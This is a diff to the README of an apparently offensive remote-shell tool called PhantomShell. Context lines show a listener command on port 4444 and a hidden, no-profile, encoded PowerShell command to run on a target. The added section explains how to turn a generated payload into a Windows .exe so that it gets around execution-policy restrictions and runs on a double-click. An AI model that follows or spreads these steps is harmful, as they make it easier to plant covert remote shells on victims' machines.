@@ -345,7 +345,32 @@ python3 phantomshell.py server -i 10.10.10.5 -p 4444 -l 2
 # Execute on target
 powershell -NoP -sta -NonI -W Hidden -enc <payload>
 ```
+# 🪟 Building the Executable
 
+Follow these steps to generate a payload and convert it into a standalone Windows executable (.exe):
+
+1. Generate the Script
+Use PhantomShell to generate your initial code. Ensure the output is configured correctly for your target environment.
+
+2. Save as PowerShell
+Once the code is generated, copy and save it into a new text file.
+
+Important: You must save the file with the .ps1 extension (e.g., payload.ps1).
+
+3. Convert to Executable (.exe)
+To make the script portable and bypass certain execution policy restrictions, convert it using the PowerShell to exe/msi Converter.
+
+Download Tool: PowerShell to exe/msi Converter (Microsoft Store)
+
+Steps:
+
+Open the converter application.
+
+Select your .ps1 file as the source.
+
+Click the Build button to generate the .exe file.
+
+The resulting file can now be run on Windows systems by double-clicking the icon.
 ---
 
 # 🛡 Security Considerations
